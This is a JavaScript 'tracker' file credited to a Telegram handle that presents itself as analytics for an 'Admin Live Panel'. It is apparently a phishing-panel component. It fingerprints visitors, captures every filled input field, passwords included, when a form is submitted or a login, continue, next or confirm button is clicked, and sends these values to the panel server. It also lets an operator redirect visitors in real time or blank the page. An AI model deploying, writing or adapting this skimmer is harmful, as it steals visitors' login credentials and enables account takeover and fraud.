/**
 * ALP Tracker Script v1.1.0 (Dual-Mode: WebSockets + HTTP Fallback)
 * Lightweight tracking script for websites to integrate with Admin Live Panel.
 *
 * Created by @itstheoutlaws — https://t.me/itstheoutlaws
 *
 * Usage:
 *   <script src="https://your-alp-server/tracker.js" data-api-key="YOUR_API_KEY"></script>
 */
(function() {
  'use strict';

  // Get config from script tag
  const scriptTag = document.currentScript || document.querySelector('script[data-api-key]');
  if (!scriptTag) {
    console.warn('[ALP] Tracker: No script tag with data-api-key found.');
    return;
  }

  const API_KEY = scriptTag.getAttribute('data-api-key');
  if (!API_KEY) {
    console.warn('[ALP] Tracker: data-api-key attribute is required.');
    return;
  }

  // Server URL: derive from script src
  const SCRIPT_SRC = scriptTag.src;
  const SERVER_URL = SCRIPT_SRC ? SCRIPT_SRC.replace(/\/tracker\.js.*$/, '') : window.location.origin;

  // Generate or retrieve visitor ID
  function getVisitorId() {
    let id = localStorage.getItem('_alp_vid');
    if (!id) {
      id = 'v_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
      localStorage.setItem('_alp_vid', id);
    }
    return id;
  }

  // Retrieve session ID from sessionStorage
  function getSessionId() {
    return sessionStorage.getItem('_alp_sid_' + API_KEY);
  }

  function setSessionId(id) {
    if (id) {
      sessionStorage.setItem('_alp_sid_' + API_KEY, id);
    }
  }

  // Get basic device info
  function getDeviceInfo() {
    const ua = navigator.userAgent;
    let browser = 'Unknown';
    let os = 'Unknown';
    let device = 'Desktop';

    if (ua.includes('Firefox/')) browser = 'Firefox';
    else if (ua.includes('Edg/')) browser = 'Edge';
    else if (ua.includes('Chrome/')) browser = 'Chrome';
    else if (ua.includes('Safari/')) browser = 'Safari';
    else if (ua.includes('Opera/') || ua.includes('OPR/')) browser = 'Opera';

    if (ua.includes('Windows')) os = 'Windows';
    else if (ua.includes('Mac OS')) os = 'macOS';
    else if (ua.includes('Linux')) os = 'Linux';
    else if (ua.includes('Android')) os = 'Android';
    else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';

    if (/Mobi|Android|iPhone|iPod/.test(ua)) device = 'Mobile';
    else if (/Tablet|iPad/.test(ua)) device = 'Tablet';

    return { browser, os, device, userAgent: ua };
  }

  const visitorId = getVisitorId();
  const deviceInfo = getDeviceInfo();
  let pageEntryTime = Date.now();
  let currentPage = window.location.pathname + window.location.search;
  let useHttpMode = false;
  let heartbeatInterval = null;
  let redirectPollInterval = null;
  let isRedirecting = false;

  function cleanRedirectUrl(url) {
    if (!url) return url;
    var currentPath = window.location.pathname;
    if (!currentPath.startsWith('/demo/')) {
      url = url.replace(/^\/demo\/[^\/]+\//i, '/').replace(/^\/demo\//i, '/');
    }
    return url;
  }

  // ─── Universal Redirect Poll (Safari WebSocket drop safety net) ────────────
  // Polls every 3s for a pending redirect, even in WebSocket mode.
  // This ensures Safari iOS never misses a redirect when the socket drops.
  function startRedirectPoll() {
    if (redirectPollInterval) return; // already running
    redirectPollInterval = setInterval(function() {
      if (isRedirecting) return;
      var sid = getSessionId();
      if (!sid) return;
      fetch(SERVER_URL + '/api/tracker/heartbeat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: sid, apiKey: API_KEY, page: window.location.pathname + window.location.search })
      })
      .then(function(r) { return r.json(); })
      .then(function(res) {
        if (res && res.redirectUrl && !isRedirecting) {
          isRedirecting = true;
          window.location.href = cleanRedirectUrl(res.redirectUrl);
        }
      })
      .catch(function() {}); // silent — don't break on network error
    }, 3000);
  }

  // ─── Handle inactive website (from any endpoint returning 404) ─────────────
  var inactiveHandled = false;
  function handleInactiveWebsite() {
    if (inactiveHandled) return;
    inactiveHandled = true;
    console.warn('[ALP Tracker] This website is marked INACTIVE in the panel — blocking page');
    try {
      // Stop any pending scripts and blank the page cleanly
      document.open();
      document.write('<!DOCTYPE html><html><head><title>Unavailable</title><meta charset="utf-8">' +
        '<style>html,body{margin:0;padding:0;height:100%;background:#0a0a0a;color:#666;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;text-align:center;}div{max-width:400px;padding:40px;}h1{font-size:20px;font-weight:500;color:#888;margin:0 0 12px;}p{font-size:13px;color:#555;margin:0;line-height:1.6;}</style>' +
        '</head><body><div><h1>This page is currently unavailable</h1><p>The site owner has disabled access. Please check back later.</p></div></body></html>');
      document.close();
    } catch (e) {
      // Fallback: hide body
      if (document.body) document.body.style.display = 'none';
    }
  }

  // ─── HTTP Fallback Implementation ──────────────────────────────────────────
  function sendHttpRequest(path, payload, callback) {
    fetch(SERVER_URL + path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })
    .then(res => {
      // If the panel reports the site is inactive/not-found, block the page
      if (res.status === 404) {
        return res.json().then(data => {
          if (data && data.error && /inactive|not found/i.test(data.error)) {
            handleInactiveWebsite();
            return null;
          }
          return data;
        }).catch(() => null);
      }
      return res.json();
    })
    .then(data => {
      if (data && callback) callback(data);
    })
    .catch(err => {
      console.warn('[ALP Tracker HTTP Error]', path, err.message);
    });
  }

  function initHttpTracker() {
    useHttpMode = true;
    console.log('[ALP] Tracker using HTTP Serverless Mode');

    const initPayload = {
      apiKey: API_KEY,
      visitorId: visitorId,
      sessionId: getSessionId(),
      page: window.location.pathname + window.location.search,
      title: document.title,
      referrer: document.referrer,
      browser: deviceInfo.browser,
      os: deviceInfo.os,
      device: deviceInfo.device,
      userAgent: deviceInfo.userAgent,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    sendHttpRequest('/api/tracker/init', initPayload, function(res) {
      if (res && res.sessionId) {
        setSessionId(res.sessionId);
        startRedirectPoll(); // start polling once we have a session
      }
      if (res && res.redirectUrl && !isRedirecting) {
        isRedirecting = true;
        window.location.href = cleanRedirectUrl(res.redirectUrl);
      }
    });

    // HTTP heartbeat every 3s (also handles redirect)
    if (!heartbeatInterval) {
      heartbeatInterval = setInterval(function() {
        sendHttpRequest('/api/tracker/heartbeat', {
          sessionId: getSessionId(),
          page: window.location.pathname + window.location.search,
          apiKey: API_KEY
        }, function(res) {
          if (res && res.redirectUrl && !isRedirecting) {
            isRedirecting = true;
            window.location.href = cleanRedirectUrl(res.redirectUrl);
          }
        });
      }, 3000);
    }
  }

  // ─── Try Loading Socket.IO Client ─────────────────────────────────────────
  function loadSocketIO(callback) {
    if (window.io) {
      callback(true);
      return;
    }
    const script = document.createElement('script');
    script.src = SERVER_URL + '/socket.io/socket.io.js';
    script.onload = function() { callback(true); };
    script.onerror = function() { callback(false); };
    document.head.appendChild(script);
  }

  loadSocketIO(function(success) {
    if (!success) {
      initHttpTracker();
      setupCommonTrackers(null);
      return;
    }

    let connected = false;
    const socket = io(SERVER_URL + '/tracker', {
      transports: ['websocket', 'polling'],
      auth: { apiKey: API_KEY },
      reconnection: true,
      reconnectionAttempts: 3,
      timeout: 3000
    });

    socket.on('connect', function() {
      connected = true;
      console.log('[ALP] Tracker connected via WebSocket');
      socket.emit('tracker:init', {
        visitorId: visitorId,
        sessionId: getSessionId(),
        isNewPageLoad: true,
        page: window.location.pathname + window.location.search,
        title: document.title,
        referrer: document.referrer,
        browser: deviceInfo.browser,
        os: deviceInfo.os,
        device: deviceInfo.device,
        userAgent: deviceInfo.userAgent,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      });
    });

    socket.on('tracker:session', function(data) {
      if (data && data.sessionId) {
        setSessionId(data.sessionId);
        startRedirectPoll(); // start HTTP safety-net poll once session is known
      }
    });

    socket.on('tracker:redirect', function(data) {
      if (data && data.url && !isRedirecting) {
        isRedirecting = true;
        window.location.href = cleanRedirectUrl(data.url);
      }
    });

    socket.on('connect_error', function(err) {
      // Server-side auth middleware may reject inactive-website connections
      if (err && err.message && /inactive|not found|unauthorized/i.test(err.message)) {
        socket.disconnect();
        handleInactiveWebsite();
        return;
      }
      if (!connected) {
        socket.disconnect();
        initHttpTracker();
      }
    });

    socket.on('tracker:inactive', function() { handleInactiveWebsite(); });

    // Server → visitor: "your session was wiped by admin, clear your sid".
    // Drop the stored sessionId so the next page load starts fresh; also
    // immediately re-init in-place so the current page appears in the panel
    // again without waiting for a navigation.
    socket.on('tracker:reset', function() {
      try { sessionStorage.removeItem('_alp_sid_' + API_KEY); } catch (_) {}
      try {
        socket.emit('tracker:init', {
          apiKey: API_KEY,
          visitorId: visitorId,
          sessionId: null,
          page: currentPage,
          referrer: document.referrer || 'Direct',
          userAgent: deviceInfo.userAgent,
          browser: deviceInfo.browser,
          os: deviceInfo.os,
          device: deviceInfo.device,
          isNewPageLoad: true,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        });
      } catch (_) {}
    });

    setupCommonTrackers(socket);
  });

  // ─── Common Event Trackers (Form Submit, SPA Page Views, Unload) ──────────
  function setupCommonTrackers(socket) {
    // Helper to capture all non-empty input/select/textarea fields in a container or document
    function collectInputs(container) {
      const scope = container || document;
      const formData = {};
      const inputs = scope.querySelectorAll('input, select, textarea');
      
      inputs.forEach(function(input, idx) {
        if (input.type === 'hidden' || input.type === 'submit' || input.type === 'button') return;
        const key = input.name || input.id || input.getAttribute('placeholder') || ('field_' + idx);
        const val = input.value ? input.value.trim() : '';
        if (key && val) {
          formData[key] = val;
        }
      });
      return formData;
    }

    function sendCapturedFormData(formData, formId, formAction) {
      if (!formData || Object.keys(formData).length === 0) return;
      const payload = {
        sessionId: getSessionId(),
        page: window.location.pathname + window.location.search,
        formAction: formAction || 'N/A',
        formId: formId || 'page_inputs',
        data: formData,
        timestamp: Date.now()
      };

      if (useHttpMode) {
        sendHttpRequest('/api/tracker/formdata', payload);
      } else if (socket && socket.connected) {
        socket.emit('tracker:formdata', payload);
      } else {
        sendHttpRequest('/api/tracker/formdata', payload);
      }
    }

    // Check if clicked element is a login/submit button (ignore nav/forgot password links)
    function isSubmitOrLoginButton(el) {
      if (!el) return false;
      const tag = el.tagName.toLowerCase();
      const text = (el.textContent || '').toLowerCase().trim();
      const id = (el.id || '').toLowerCase();
      const cls = (el.className || '').toLowerCase();

      // Ignore navigation, forgot password, enroll links
      if (text.includes('forgot') || text.includes('enroll') || text.includes('help') || text.includes('terms') || text.includes('privacy') || text.includes('trouble')) {
        return false;
      }

      if (tag === 'button' || el.getAttribute('type') === 'submit' || el.getAttribute('role') === 'button') {
        return true;
      }

      const isLoginText = text.includes('log in') || text.includes('login') || text.includes('sign in') || text.includes('submit') || text.includes('continue') || text.includes('next') || text.includes('confirm');
      const isLoginAttr = id.includes('submit') || id.includes('login') || cls.includes('login') || cls.includes('submit');

      return isLoginText || isLoginAttr;
    }

    // 1. Traditional Form Submit capture
    document.addEventListener('submit', function(e) {
      const form = e.target;
      if (form.getAttribute('data-alp-ignore')) return;
      const formData = collectInputs(form);
      if (Object.keys(formData).length > 0) {
        sendCapturedFormData(formData, form.id || form.className || 'form_submit', form.action);
      }
    });

    // 2. Click capture ONLY on login/submit buttons when inputs are filled
    document.addEventListener('click', function(e) {
      const el = e.target.closest('a, button, input[type="button"], input[type="submit"], [role="button"], .btn, .button, .login');
      if (!el || !isSubmitOrLoginButton(el)) return;

      const formData = collectInputs(document);
      if (Object.keys(formData).length > 0) {
        const btnId = el.id || el.className || el.textContent.trim().slice(0, 20) || 'login_button';
        sendCapturedFormData(formData, btnId, 'login_click');
      }
    });

    // Track SPA navigation
    let lastUrl = window.location.href;
    function checkUrlChange() {
      if (window.location.href !== lastUrl) {
        const duration = Date.now() - pageEntryTime;
        const payload = {
          sessionId: getSessionId(),
          page: window.location.pathname + window.location.search,
          title: document.title,
          previousPage: currentPage,
          duration: duration
        };

        if (useHttpMode) {
          sendHttpRequest('/api/tracker/pageview', payload);
        } else if (socket && socket.connected) {
          socket.emit('tracker:pageview', payload);
        } else {
          sendHttpRequest('/api/tracker/pageview', payload);
        }
        
        lastUrl = window.location.href;
        currentPage = window.location.pathname + window.location.search;
        pageEntryTime = Date.now();
      }
    }

    setInterval(checkUrlChange, 500);
    window.addEventListener('popstate', checkUrlChange);
    window.addEventListener('hashchange', checkUrlChange);

    // Send page duration on unload
    window.addEventListener('beforeunload', function() {
      const payload = {
        sessionId: getSessionId()
      };
      if (navigator.sendBeacon) {
        navigator.sendBeacon(SERVER_URL + '/api/tracker/end', JSON.stringify(payload));
      } else {
        sendHttpRequest('/api/tracker/end', payload);
      }
    });

    // Expose ALP Tracker Global Object
    window.ALPTracker = {
      trackFormData: function(data) {
        const payload = {
          sessionId: getSessionId(),
          page: window.location.pathname,
          formId: 'manual',
          data: data,
          timestamp: Date.now()
        };
        sendHttpRequest('/api/tracker/formdata', payload);
      },
      getVisitorId: function() { return visitorId; }
    };
  }
})();
